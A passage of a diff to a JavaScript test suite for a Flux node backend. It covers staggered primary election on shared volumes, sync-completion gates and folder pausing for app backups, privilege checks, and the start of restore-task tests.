+      // Index 2: behind two peers, and far enough back to book a turn rather than
+      // start at once (at index 1 the wait computes to zero).
+      const runPass = electionFixture(
+        appName,
+        ['192.168.1.90:16127', '192.168.1.91:16127'],
+        { selfRunningSince: '2026-01-01T00:03:00.000Z' },
+      );
+      const clock = sinon.useFakeTimers({ now: Date.now(), toFake: ['Date'] });
+
+      // Pass 1: FDM names a primary, so this node remembers one. Nothing else happens
+      // - it is a standby with no container.
+      serviceHelperStub.resolves({ data: { status: 'success', data: { ips: ['192.168.1.90'] } } });
+      await runPass();
+
+      // Pass 2: the primary is gone from FDM. The previous-primary branch probes it,
+      // finds it free, and books this node's turn one place back.
+      serviceHelperStub.resolves(fdmNoPrimary());
+      axiosGetStub.resetBehavior();
+      axiosGetStub.callsFake(peerAnswers({ held: [] }));
+      await runPass();
+      expect(linesMatching(logInfo, 'will start docker app')).to.have.lengthOf(1);
+
+      // Both instances ahead of this one age out of the location list. This node is
+      // now index 0 and still holds the turn it booked at index 2.
+      registryManagerStub.resolves([
+        { name: appName, ip: '192.168.1.5:16127', runningSince: '2026-01-01T00:03:00.000Z' },
+        { name: appName, ip: '192.168.1.92:16127', runningSince: '2026-01-01T00:04:00.000Z' },
+      ]);
+
+      // The turn comes due, and a LESS senior node is running the component - the
+      // FDM-lag window. Only a probe can see it; FDM still says there is no primary.
+      clock.tick(config.fluxapps.masterSlaveStaggerMs);
+      logInfo.resetHistory();
+      axiosGetStub.resetBehavior();
+      axiosGetStub.callsFake(peerAnswers({ held: [`flux${appName}`] }));
+      await runPass();
+
+      expect(linesMatching(logInfo, 'is held on peer node')).to.have.lengthOf(1);
+      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
+    });
+
+    it('leaves the staggered order alone when there IS a node ahead to ask', async () => {
+      // The escalation above must not turn every due turn into a fleet-wide probe:
+      // at index 1 the node ahead is the one the stagger exists to defer to, and
+      // asking it alone is the whole point of the lower-only scope.
+      const appName = 'duestagger1app';
+      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
+      const logInfo = sinon.stub(log, 'info');
+      const runPass = electionFixture(
+        appName,
+        ['192.168.1.90:16127'],
+        { selfRunningSince: '2026-01-01T00:02:00.000Z' },
+      );
+      serviceHelperStub.resolves(fdmNoPrimary());
+      const clock = sinon.useFakeTimers({ now: Date.now(), toFake: ['Date'] });
+
+      axiosGetStub.resetBehavior();
+      axiosGetStub.callsFake(peerAnswers({ held: [] }));
+      await runPass();
+      expect(linesMatching(logInfo, 'scheduling app')).to.have.lengthOf(1);
+
+      clock.tick(config.fluxapps.masterSlaveStaggerMs);
+      logInfo.resetHistory();
+      axiosGetStub.resetBehavior();
+      // Only the node ahead is asked, and it is free - so this node takes the primary.
+      axiosGetStub.callsFake(peerAnswers({ held: [] }));
+      await runPass();
+
+      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(1);
+    });
+
+    // The test above cannot actually see the scope. With ONE peer, 'lower' and
+    // 'all' probe the same single node, so "asked the node ahead" and "asked
+    // everybody" are observationally identical and the escalation could become
+    // unconditional without a test noticing. This node sits at index 1 with a
+    // peer on either side, and only the one BELOW it should be asked.
+    //
+    // What it costs if the scope escalates: every staggered due-turn becomes a
+    // fleet-wide probe, at election cadence, on every node running the app.
+    it('asks only the node ahead on a due stagger, not every instance', async () => {
+      const appName = 'duestaggerscopeapp';
+      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
+      const logInfo = sinon.stub(log, 'info');
+      const runPass = electionFixture(
+        appName,
+        ['192.168.1.90:16127', '192.168.1.91:16127'],
+        { selfRunningSince: '2026-01-01T00:01:30.000Z' },
+      );
+      serviceHelperStub.resolves(fdmNoPrimary());
+      const clock = sinon.useFakeTimers({ now: Date.now(), toFake: ['Date'] });
+
+      // Ordered by runningSince: .90 (00:01) is index 0, this node (00:01:30) is
+      // index 1, .91 (00:02) is index 2. The node ABOVE holds the component; a
+      // lower-only probe never asks it, an escalated one does.
+      const answerByPeer = (url) => {
+        if (url.includes('/apps/heldcomponents')) {
+          const held = url.includes('192.168.1.91') ? [`flux${appName}`] : [];
+          return Promise.resolve({ data: { data: held } });
+        }
+        return Promise.resolve({ data: { data: [] } });
+      };
+
+      axiosGetStub.resetBehavior();
+      axiosGetStub.callsFake(answerByPeer);
+      await runPass();
+      expect(linesMatching(logInfo, 'scheduling app')).to.have.lengthOf(1);
+
+      clock.tick(config.fluxapps.masterSlaveStaggerMs);
+      logInfo.resetHistory();
+      axiosGetStub.resetBehavior();
+      axiosGetStub.callsFake(answerByPeer);
+      await runPass();
+
+      expect(
+        linesMatching(logInfo, 'starting docker component'),
+        'did not start - a node ABOVE this one was probed, so the scope escalated past the stagger',
+      ).to.have.lengthOf(1);
+      clock.restore();
+    });
+
+    // index is re-derived from the location list on every pass, so a node that
+    // booked a stagger can find itself ABSENT from that list when its turn comes
+    // - the instances ahead aged out, or its own row lapsed. index is then -1, and
+    // a lower-only walk of "everyone below index -1" asks NOBODY, which the caller
+    // reads as clear. That is a blind start onto a shared volume, reached from the
+    // staggered path rather than the index-0 one.
+    it('escalates rather than starting blind when this node has left the location list', async () => {
+      const appName = 'droppedoutapp';
+      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
+      const logInfo = sinon.stub(log, 'info');
+      const runPass = electionFixture(
+        appName,
+        ['192.168.1.90:16127', '192.168.1.91:16127'],
+        { selfRunningSince: '2026-01-01T00:03:00.000Z' },
+      );
+      serviceHelperStub.resolves(fdmNoPrimary());
+      const clock = sinon.useFakeTimers({ now: Date.now(), toFake: ['Date'] });
+
+      // Pass 1: this node is index 2 and books its stagger.
+      axiosGetStub.resetBehavior();
+      axiosGetStub.callsFake(peerAnswers({ held: [] }));
+      await runPass();
+      expect(linesMatching(logInfo, 'scheduling app')).to.have.lengthOf(1);
+
+      // The turn arrives, and by now this node is no longer in the list at all.
+      clock.tick(config.fluxapps.masterSlaveStaggerMs * 3);
+      registryManagerStub.resolves([
+        { name: appName, ip: '192.168.1.90:16127', runningSince: '2026-01-01T00:01:00.000Z' },
+        { name: appName, ip: '192.168.1.91:16127', runningSince: '2026-01-01T00:02:00.000Z' },
+      ]);
+      logInfo.resetHistory();
+      axiosGetStub.resetBehavior();
+      // A peer IS running it. Escalating finds that; asking nobody does not.
+      axiosGetStub.callsFake(peerAnswers({ held: [`flux${appName}`] }));
+      await runPass();
+
+      expect(
+        linesMatching(logInfo, 'starting docker component'),
+        'started without asking anyone - a second writer on the shared volume',
+      ).to.have.lengthOf(0);
+      clock.restore();
+    });
+
+    it('takes the per-place stagger from config, not from a literal', async () => {
+      // Four call sites computed the wait from `index * 3 * 60 * 1000`, which is why
+      // no harness suite exercises a staggered start: reaching one costs minutes of
+      // wall clock, so the whole class went uncovered at rig level.
+      //
+      // Asserted to the millisecond against the CONFIGURED value, and the unit
+      // config deliberately differs from the code's fallback - otherwise a
+      // misspelled key would default to the same 3 minutes and read as wired.
+      const appName = 'staggerconfigapp';
+      const stagger = config.fluxapps.masterSlaveStaggerMs;
+      expect(stagger, 'unit config must differ from the fallback or this proves nothing').to.not.equal(3 * 60 * 1000);
+      sinon.stub(appsRuntimeState, 'isOperatorStopped').resolves(false);
+      const logInfo = sinon.stub(log, 'info');
+      const runPass = electionFixture(
+        appName,
+        ['192.168.1.90:16127'],
+        { selfRunningSince: '2026-01-01T00:02:00.000Z' },
+      );
+      serviceHelperStub.resolves(fdmNoPrimary());
+      axiosGetStub.resetBehavior();
+      axiosGetStub.callsFake(peerAnswers({ held: [] }));
+      const clock = sinon.useFakeTimers({ now: Date.now(), toFake: ['Date'] });
+
+      // Index 1, no history: one place of wait.
+      await runPass();
+      expect(linesMatching(logInfo, 'scheduling app')).to.have.lengthOf(1);
+
+      // One millisecond short: still not this node's turn.
+      clock.tick(stagger - 1);
+      logInfo.resetHistory();
+      await runPass();
+      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(0);
+
+      // And due on the millisecond the configured wait elapses.
+      clock.tick(1);
+      logInfo.resetHistory();
+      await runPass();
+      expect(linesMatching(logInfo, 'starting docker component')).to.have.lengthOf(1);
+    });
+
     it('keeps the seed claim when a peer cannot be ruled out, rather than spending it on a non-answer', async () => {
       // The claim is what the seed decision is made FROM, and no decision was
       // reached. Spending it here drops this node to the index stagger on no
@@ -1271,7 +1696,7 @@ describe('advancedWorkflows tests', () => {
         ['192.168.1.90:16127', '192.168.1.91:16127'],
         { selfRunningSince: '2026-01-01T00:02:30.000Z', receiveOnlyCache: cache },
       );
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
       // both peers silent, and this node has no view of either
 
       await runPass();
@@ -1302,7 +1727,7 @@ describe('advancedWorkflows tests', () => {
       // Cycle 2: FDM reports no primary and the peer has gone silent - but its
       // syncthing connection to this node is still open, so it is restarting.
       serviceHelperStub.resetBehavior();
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
       axiosGetStub.resetBehavior();
       axiosGetStub.rejects(new Error('previous primary unreachable'));
       peerSyncthingSays('192.168.1.90:16127', 'valid');
@@ -1332,10 +1757,8 @@ describe('advancedWorkflows tests', () => {
         ],
       });
       const listRunningApps = sinon.stub().resolves({ status: 'success', data: [] });
-      const receiveOnlyCache = new Map([
-        [`flux${first}`, { restarted: true }],
-        [`flux${second}`, { restarted: true }],
-      ]);
+      globalState.receiveOnlySyncthingAppsCache.set(`flux${first}`, { restarted: true });
+      globalState.receiveOnlySyncthingAppsCache.set(`flux${second}`, { restarted: true });
       fluxNetworkHelperStub.resolves('192.168.1.5:16127');
       // This node is index 0 for both, so the second app is startable the moment
       // it is reached - which makes "was it reached?" unambiguous.
@@ -1365,7 +1788,7 @@ describe('advancedWorkflows tests', () => {
         delayCalls = 0;
         globalState.installationInProgress = false;
         await advancedWorkflows.masterSlaveApps(
-          globalState, installedApps, listRunningApps, receiveOnlyCache, [], [], require('https'),
+          globalState, installedApps, listRunningApps, require('https'),
         );
       };
 
@@ -1379,7 +1802,7 @@ describe('advancedWorkflows tests', () => {
       // Cycle 2: FDM reports no primary for either. The peer answers, and holds the
       // FIRST component only - so app one is settled and app two is free.
       serviceHelperStub.resetBehavior();
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
       axiosGetStub.resetBehavior();
       axiosGetStub.callsFake(peerAnswers({ held: [`flux${first}`] }));
 
@@ -1409,15 +1832,11 @@ describe('advancedWorkflows tests', () => {
         data: [],
       });
 
-      const receiveOnlyCache = new Map();
-      receiveOnlyCache.set('zel_masterslaveapp', { restarted: true });
-
-      const backupInProgress = [];
-      const restoreInProgress = [];
+      globalState.receiveOnlySyncthingAppsCache.set('zel_masterslaveapp', { restarted: true });
       const https = require('https');
 
       // Mock FDM responses (no IP)
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
 
       // Mock node IP
       fluxNetworkHelperStub.resolves('192.168.1.5:16127');
@@ -1452,9 +1871,6 @@ describe('advancedWorkflows tests', () => {
         globalState,
         installedApps,
         listRunningApps,
-        receiveOnlyCache,
-        backupInProgress,
-        restoreInProgress,
         https,
       );
 
@@ -1481,15 +1897,11 @@ describe('advancedWorkflows tests', () => {
         data: [],
       });
 
-      const receiveOnlyCache = new Map();
-      receiveOnlyCache.set('zel_masterslaveapp', { restarted: true });
-
-      const backupInProgress = [];
-      const restoreInProgress = [];
+      globalState.receiveOnlySyncthingAppsCache.set('zel_masterslaveapp', { restarted: true });
       const https = require('https');
 
       // Mock FDM responses (no IP)
-      serviceHelperStub.resolves({ data: [] });
+      serviceHelperStub.resolves(fdmNoPrimary());
 
       // Mock node IP - this node is at index 1 (second in list)
       fluxNetworkHelperStub.resolves('192.168.1.10:16127');
@@ -1523,9 +1935,6 @@ describe('advancedWorkflows tests', () => {
         globalState,
         installedApps,
         listRunningApps,
-        receiveOnlyCache,
-        backupInProgress,
-        restoreInProgress,
         https,
       );
 
@@ -1567,7 +1976,6 @@ describe('advancedWorkflows tests', () => {
         ],
       });
 
-      const receiveOnlyCache = new Map();
       const https = require('https');
 
       // FDM reports the primary is another node
@@ -1579,9 +1987,6 @@ describe('advancedWorkflows tests', () => {
         globalState,
         installedApps,
         listRunningApps,
-        receiveOnlyCache,
-        [],
-        [],
         https,
       );
 
@@ -1622,7 +2027,6 @@ describe('advancedWorkflows tests', () => {
         ],
       });
 
-      const receiveOnlyCache = new Map();
       const https = require('https');
 
       // FDM reports the primary is another node
@@ -1633,9 +2037,6 @@ describe('advancedWorkflows tests', () => {
         globalState,
         installedApps,
         listRunningApps,
-        receiveOnlyCache,
-        [],
-        [],
         https,
       );
 
@@ -1678,7 +2079,6 @@ describe('advancedWorkflows tests', () => {
         ],
       });
 
-      const receiveOnlyCache = new Map();
       const https = require('https');
 
       // FDM returns a bare IP (current production behavior - no FDM change required).
@@ -1690,9 +2090,6 @@ describe('advancedWorkflows tests', () => {
         globalState,
         installedApps,
         listRunningApps,
-        receiveOnlyCache,
-        [],
-        [],
         https,
       );
 
@@ -1731,7 +2128,6 @@ describe('advancedWorkflows tests', () => {
         ],
       });
 
-      const receiveOnlyCache = new Map();
       const https = require('https');
 
       // FDM primary is a different node, returned as a bare IP (production format).
@@ -1743,9 +2139,6 @@ describe('advancedWorkflows tests', () => {
         globalState,
         installedApps,
         listRunningApps,
-        receiveOnlyCache,
-        [],
-        [],
         https,
       );
 
@@ -2327,6 +2720,16 @@ describe('advancedWorkflows tests', () => {
       volGlobalState.receiveOnlySyncthingAppsCache.clear();
       const hwRequirements = require('../../ZelBack/src/services/appRequirements/hwRequirements');
       sinon.stub(hwRequirements, 'getNodeSpecs').resolves({ ssdStorage: 10000 });
+      // The volume search reads the real mount table through findmnt. Stubbing
+      // it keeps these cases about the synced-mark rather than about whichever
+      // disks the machine running the suite happens to have.
+      // eslint-disable-next-line global-require
+      const volumeService = require('../../ZelBack/src/services/utils/volumeService');
+      sinon.stub(volumeService, 'capacityVolumesInGib').resolves([
+        {
+          filesystem: '/dev/sda1', mount: '/dat', size: 1000, used: 100, available: 900,
+        },
+      ]);
     });
 
     afterEach(() => {
@@ -2385,6 +2788,1126 @@ describe('advancedWorkflows tests', () => {
         volGlobalState.receiveOnlySyncthingAppsCache.has(identifier),
         'the point of no return left a stale synced-mark in place',
       ).to.equal(false);
+    });
+  });
+
+  describe('appendBackupTask sync gate tests', () => {
+    // A backup is deliberately taken from a standby - the quiescent copy - so
+    // the only thing that makes the archive worth keeping is that the copy is
+    // COMPLETE. A folder that has never synced (or is behind) archives whatever
+    // happens to be on disk, which can be nothing: that is how a 373-byte
+    // "backup" of a 35 GB app came to exist, and restoring it destroyed the
+    // world it was supposed to protect.
+    // eslint-disable-next-line global-require
+    const verificationHelper = require('../../ZelBack/src/services/verificationHelper');
+    // eslint-disable-next-line global-require
+    const registryManager = require('../../ZelBack/src/services/appDatabase/registryManager');
+    // eslint-disable-next-line global-require
+    const stateMachine = require('../../ZelBack/src/services/appMonitoring/syncthingFolderStateMachine');
+    // eslint-disable-next-line global-require
+    const syncthingService = require('../../ZelBack/src/services/syncthingService');
+    // eslint-disable-next-line global-require
+    const dockerService = require('../../ZelBack/src/services/dockerService');
+    // eslint-disable-next-line global-require
+    const IOUtils = require('../../ZelBack/src/services/IOUtils');
+    // eslint-disable-next-line global-require
+    const globalState = require('../../ZelBack/src/services/utils/globalState');
+
+    const appname = 'palworld1785719281005';
+    const folderId = `fluxpalworld_${appname}`;
+
+    function makeRes() {
+      return {
+        write: sinon.stub(),
+        flush: sinon.stub(),
+        end: sinon.stub(),
+        json: sinon.stub(),
+        chunks: [],
+      };
+    }
+
+    function backupReq() {
+      return { body: { appname, backup: [{ component: 'palworld', backup: true }] }, headers: {} };
+    }
+
+    beforeEach(() => {
+      globalState.backupInProgress = [];
+      // the flow sleeps between phases; that is not what these tests are about
+      // eslint-disable-next-line global-require
+      const serviceHelper = require('../../ZelBack/src/services/serviceHelper');
+      sinon.stub(serviceHelper, 'delay').resolves();
+      sinon.stub(verificationHelper, 'verifyPrivilege').resolves(true);
+      sinon.stub(registryManager, 'getApplicationGlobalSpecifications').resolves({
+        version: 8,
+        name: appname,
+        compose: [{ name: 'palworld', containerData: 'g:/palworld/Pal/Saved|m:mods:/mods' }],
+      });
+      // The stop enumerates the app's components from here. Unstubbed it threw
+      // 'Application not found', which the old wrapper swallowed - so these
+      // tests passed while nothing was ever stopped.
+      sinon.stub(registryManager, 'getApplicationSpecifications').resolves({
+        version: 8,
+        name: appname,
+        compose: [{ name: 'palworld', containerData: 'g:/palworld/Pal/Saved|m:mods:/mods' }],
+      });
+      sinon.stub(syncthingService, 'adjustConfigFolders').resolves({ status: 'success' });
+      sinon.stub(dockerService, 'appDockerStop').resolves();
+      // The stop is verified by reading the container back, not by the stop
+      // call returning - so this stub is what makes the containers actually
+      // down for these tests. Set it Running to exercise the refusal.
+      sinon.stub(dockerService, 'dockerContainerInspect').resolves({ State: { Running: false } });
+      // dockerActual falls back to a LIST call when the inspect fails, to tell
+      // an unreachable daemon from a container that is genuinely gone. Docker is
+      // a network boundary and has to be stubbed at it - left real, these tests
+      // pass or fail on whether the machine running them happens to have docker.
+      sinon.stub(dockerService, 'dockerListContainers').resolves([]);
+      sinon.stub(dockerService, 'appDockerStart').resolves();
+      sinon.stub(IOUtils, 'createTarGz').resolves({ status: true });
+      sinon.stub(IOUtils, 'checkFileExists').resolves(false);
+      sinon.stub(IOUtils, 'removeFile').resolves(true);
+      sinon.stub(IOUtils, 'getVolumeInfo').resolves({ error: null, mounts: [{ mount: '/mnt/appdata/flux-apps/fluxpalworld_x' }] });
+      sinon.stub(log, 'info');
+      sinon.stub(log, 'warn');
+      sinon.stub(log, 'error');
+    });
+
+    it('refuses when this instance has no syncthing folder at all', async () => {
+      // the incident shape: the node was never configured to sync, so its copy
+      // is empty by construction
+      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({ status: null, reason: 'absent' });
+      const res = makeRes();
+
+      const result = await advancedWorkflows.appendBackupTask(backupReq(), res);
+
+      expect(result).to.equal(false);
+      sinon.assert.notCalled(IOUtils.createTarGz);
+      // and it cost the app nothing: the refusal lands before any stop
+      sinon.assert.notCalled(dockerService.appDockerStop);
+      sinon.assert.notCalled(syncthingService.adjustConfigFolders);
+      expect(globalState.backupInProgress).to.not.include(appname);
+    });
+
+    it('refuses cleanly when the app has no specification, not with a TypeError', async () => {
+      // The restore guards this; the backup read the spec and handed it straight
+      // to syncedComponentsOfApp, which threw on null deep in the flow instead of
+      // saying what was wrong.
+      registryManager.getApplicationGlobalSpecifications.resolves(null);
+      const res = makeRes();
+
+      const result = await advancedWorkflows.appendBackupTask(backupReq(), res);
+
+      expect(result).to.equal(false);
+      const said = res.write.getCalls().map((c) => c.args[0]).join(' ');
+      expect(said).to.include('no specifications found');
+      sinon.assert.notCalled(dockerService.appDockerStop);
+    });
+
+    it('refuses a backup that is not a list of components, not with a TypeError', async () => {
+      // The UI always sends an array. A caller that sends the single component it
+      // wants as a bare value reached .some() and had the interpreter's own
+      // wording relayed down the progress stream as the refusal.
+      const res = makeRes();
+
+      const result = await advancedWorkflows.appendBackupTask(
+        { body: { appname, backup: 'palworld' }, headers: {} }, res,
+      );
+
+      expect(result).to.equal(false);
+      const said = res.write.getCalls().map((c) => c.args[0]).join(' ');
+      expect(said).to.include('backup must be a list of components');
+      expect(said, 'the refusal is stated, not relayed from the interpreter').to.not.include('is not a function');
+      // and it lands ahead of the claim, so the app is not left leased
+      expect(globalState.backupInProgress).to.not.include(appname);
+    });
+
+    it('refuses when syncthing cannot be reached, and does not call that "never synced"', async () => {
+      // A daemon that is down or restarting says nothing about the data. The
+      // refusal is still right - an archive of an unverified copy looks fine and
+      // loses data when it is restored months later - but telling an operator
+      // their instance has never synced, at the moment they are trying to protect
+      // it, is a false statement about their data.
+      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({ status: null, reason: 'unknown' });
+      const res = makeRes();
+
+      const result = await advancedWorkflows.appendBackupTask(backupReq(), res);
+
+      expect(result).to.equal(false);
+      sinon.assert.notCalled(IOUtils.createTarGz);
+      sinon.assert.notCalled(dockerService.appDockerStop);
+      const said = res.write.getCalls().map((c) => c.args[0]).join(' ');
+      expect(said, 'says what actually happened').to.include('could not be determined');
+      expect(said, 'and does not claim anything about the data').to.not.include('never synced');
+    });
+
+    it('does not call an empty index "100% synced" while refusing it', async () => {
+      // Nothing in the global index means nothing to take a fraction of, so the
+      // percentage falls back to 100. Printing it says the copy is complete in
+      // the same message that refuses it for being incomplete.
+      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({
+        status: {
+          isSynced: false, syncPercentage: 100, inSyncBytes: 0, globalBytes: 0,
+        },
+        reason: 'ok',
+      });
+      const res = makeRes();
+
+      const result = await advancedWorkflows.appendBackupTask(backupReq(), res);
+
+      expect(result).to.equal(false);
+      const said = res.write.getCalls().map((c) => c.args[0]).join(' ');
+      expect(said, 'never claims completeness while refusing').to.not.include('100.00% synced');
+      expect(said).to.include('nothing in the sync index yet');
+    });
+
+    it('refuses a copy that is still catching up', async () => {
+      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({
+        status: { isSynced: false, syncPercentage: 41.5, inSyncBytes: 415, globalBytes: 1000 },
+        reason: 'ok',
+      });
+      const res = makeRes();
+
+      const result = await advancedWorkflows.appendBackupTask(backupReq(), res);
+
+      expect(result).to.equal(false);
+      sinon.assert.notCalled(IOUtils.createTarGz);
+      sinon.assert.notCalled(dockerService.appDockerStop);
+    });
+
+    it('proceeds over an incomplete copy when force is given', async () => {
+      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({ status: null, reason: 'absent' });
+      const req = backupReq();
+      req.body.force = true;
+
+      const result = await advancedWorkflows.appendBackupTask(req, makeRes());
+
+      expect(result).to.equal(true);
+      sinon.assert.calledOnce(IOUtils.createTarGz);
+    });
+
+    it('pauses the folder for the archive and never deletes it', async () => {
+      // deleting the folder loses its config, and only the syncthing monitor's
+      // per-app pass ever recreates it - on a node where that pass cannot
+      // complete, the app silently stops being redundant for good
+      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({
+        status: { isSynced: true, syncPercentage: 100, inSyncBytes: 1000, globalBytes: 1000 },
+        reason: 'ok',
+      });
+
+      const result = await advancedWorkflows.appendBackupTask(backupReq(), makeRes());
+
+      expect(result).to.equal(true);
+      sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: true }, folderId);
+      sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: false }, folderId);
+      sinon.assert.neverCalledWith(syncthingService.adjustConfigFolders, 'delete');
+    });
+
+    it('refuses when the pause is denied, instead of reading denial as absence', async () => {
+      // ERR_BAD_REQUEST spans every 4xx, so the axios code cannot tell a 404
+      // (no such folder - nothing to hold) from a 403 (a stale api key - the
+      // folder may be live and unheld). Only the HTTP status separates them,
+      // and anything but a bare 404 must refuse: proceeding clears appdata
+      // under a live sendreceive folder and the deletions reach every peer.
+      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({
+        status: { isSynced: true, syncPercentage: 100, inSyncBytes: 1000, globalBytes: 1000 },
+        reason: 'ok',
+      });
+      syncthingService.adjustConfigFolders.resolves({
+        status: 'error',
+        data: {
+          message: 'Request failed with status code 403', name: 'AxiosError', code: 'ERR_BAD_REQUEST', httpStatus: 403,
+        },
+      });
+      const res = makeRes();
+
+      const result = await advancedWorkflows.appendBackupTask(backupReq(), res);
+
+      expect(result).to.equal(false);
+      sinon.assert.notCalled(IOUtils.createTarGz);
+      sinon.assert.notCalled(dockerService.appDockerStop);
+      const said = res.write.getCalls().map((c) => c.args[0]).join(' ');
+      expect(said).to.include('could not be held still');
+    });
+
+    it('reads a bare 404 as the folder being absent, and proceeds', async () => {
+      // syncthing replied: it holds no such folder, so nothing is replicating
+      // the directory and there is nothing to hold still.
+      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({
+        status: { isSynced: true, syncPercentage: 100, inSyncBytes: 1000, globalBytes: 1000 },
+        reason: 'ok',
+      });
+      syncthingService.adjustConfigFolders.resolves({
+        status: 'error',
+        data: {
+          message: 'Request failed with status code 404', name: 'AxiosError', code: 'ERR_BAD_REQUEST', httpStatus: 404,
+        },
+      });
+
+      const result = await advancedWorkflows.appendBackupTask(backupReq(), makeRes());
+
+      expect(result).to.equal(true);
+      sinon.assert.calledOnce(IOUtils.createTarGz);
+    });
+
+    it('resolves the folder id per COMPONENT, not from the app name', async () => {
+      // folder ids are docker app identifiers, so a composed app's folder is
+      // flux<component>_<app>. Addressing it as flux<app> matches nothing, and
+      // the freeze silently does not happen.
+      const completion = sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({
+        status: { isSynced: true, syncPercentage: 100, inSyncBytes: 1000, globalBytes: 1000 },
+        reason: 'ok',
+      });
+
+      await advancedWorkflows.appendBackupTask(backupReq(), makeRes());
+
+      sinon.assert.calledWithExactly(completion, `fluxpalworld_${appname}`);
+      sinon.assert.neverCalledWith(completion, `flux${appname}`);
+    });
+
+    it('resumes the folder when the archive fails', async () => {
+      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({
+        status: { isSynced: true, syncPercentage: 100, inSyncBytes: 1000, globalBytes: 1000 },
+        reason: 'ok',
+      });
+      IOUtils.createTarGz.resolves({ status: false, error: 'no space left on device' });
+
+      const result = await advancedWorkflows.appendBackupTask(backupReq(), makeRes());
+
+      expect(result).to.equal(false);
+      sinon.assert.calledWithExactly(syncthingService.adjustConfigFolders, 'patch', { paused: false }, folderId);
+      expect(globalState.backupInProgress).to.not.include(appname);
+    });
+
+    it('lets only one of two concurrent backups of the same app proceed', async () => {
+      // Between the old check and its later claim sat auth, a spec fetch and a
+      // sync probe per component; two requests could both pass the emptied
+      // check and archive the same volume at once. The claim is now a
+      // synchronous test-and-set before any of that, so the second finds the
+      // app taken and refuses.
+      sinon.stub(stateMachine, 'probeFolderSyncCompletion').resolves({
+        status: { isSynced: true, syncPercentage: 100, inSyncBytes: 1000, globalBytes: 1000 },
+        reason: 'ok',
+      });
+
+      const first = advancedWorkflows.appendBackupTask(backupReq(), makeRes());
+      const second = advancedWorkflows.appendBackupTask(backupReq(), makeRes());
+
+      const [firstResult, secondResult] = await Promise.all([first, second]);
+
+      expect([firstResult, secondResult]).to.have.members([true, false]);
+      sinon.assert.calledOnce(IOUtils.createTarGz);
+    });
+
+    // appownerorfluxteam admits the app's owner and the flux team, and refuses the
+    // node operator - so the string this asks for is the whole of the policy. An
+    // archive of a customer's volume is theirs, and taking one off the node is
+    // not their host's to order.
+    it('gates a backup on the privilege that refuses the node operator', async () => {
+      verificationHelper.verifyPrivilege.resolves(false);
+      const req = backupReq();
+
+      await advancedWorkflows.appendBackupTask(req, makeRes());
+
+      sinon.assert.calledOnceWithExactly(verificationHelper.verifyPrivilege, Privilege.APP_OWNER_OR_FLUX_TEAM, authOf(req), { appName: appname });
+      sinon.assert.notCalled(IOUtils.createTarGz);
+    });
+  });
+
+  describe('appendRestoreTask tests', () => {
+    // The restore deleted appdata before it had an archive to put back, and then
+    // told every other instance to hard redeploy - which rm -rf'd their volumes.
+    // A 373-byte archive taken from an instance that had never synced was enough
+    // to destroy a 35 GB world on the one node that did hold it. So: nothing is
+    // destroyed until a complete archive is known to exist, and no peer is ever
+    // asked to delete anything.
+    // eslint-disable-next-line global-require
+    const verificationHelper = require('../../ZelBack/src/services/verificationHelper');
+    // eslint-disable-next-line global-require
+    const registryManager = require('../../ZelBack/src/services/appDatabase/registryManager');
+    // eslint-disable-next-line global-require
+    const syncthingService = require('../../ZelBack/src/services/syncthingService');
+    // eslint-disable-next-line global-require
+    const dockerService = require('../../ZelBack/src/services/dockerService');
+    // eslint-disable-next-line global-require
+    const IOUtils = require('../../ZelBack/src/services/IOUtils');
+    // eslint-disable-next-line global-require
+    const globalState = require('../../ZelBack/src/services/utils/globalState');
+    // eslint-disable-next-line global-require
+    const serviceHelper = require('../../ZelBack/src/services/serviceHelper');
+    // eslint-disable-next-line global-require
+    const fluxNetworkHelper = require('../../ZelBack/src/services/fluxNetworkHelper');
+    // eslint-disable-next-line global-require
+    const appController = require('../../ZelBack/src/services/appManagement/appController');
+    // eslint-disable-next-line global-require
+    const appReconciler = require('../../ZelBack/src/services/appMonitoring/appReconciler');
+    // eslint-disable-next-line global-require
+    const appInspector = require('../../ZelBack/src/services/appManagement/appInspector');
+    // eslint-disable-next-line global-require
+    const { appsFolder } = require('../../ZelBack/src/services/utils/appConstants');
+
+    const appname = 'palworld1785719281005';
+    const folderId = `fluxpalworld_${appname}`;
+    const mount = `/mnt/appdata/flux-apps/${folderId}`;
+    const localAddr = '1.2.3.4:16127';
+
+    function specWith(containerData) {
+      return {
+        version: 8,
+        name: appname,
+        compose: [{ name: 'palworld', containerData }],
+      };
+    }
+
+    function makeRes() {
+      return {
+        write: sinon.stub(), flush: sinon.stub(), end: sinon.stub(), json: sinon.stub(),
+      };
+    }
+
+    // The UI sends EVERY component of the app on every request, the unselected
+    // ones flagged false and carrying an empty url.
+    function restoreReq(overrides = {}) {
+      return {
+        body: {
+          appname,
+          type: 'remote',
+          restore: [
+            { component: 'palworld', restore: true, url: 'https://example.invalid/backup_palworld.tar.gz' },
+            { component: 'sidecar', restore: false, url: '' },
+          ],
+          ...overrides,
+        },
+        headers: { zelidauth: 'auth' },
+      };
+    }
+
+    function fdmNames(ip) {
+      serviceHelper.axiosGet.resolves({ data: { status: 'success', data: { ips: [ip] } } });
+    }
+
+    beforeEach(() => {
+      // Release any lease a prior test left, through the claim's own primitive -
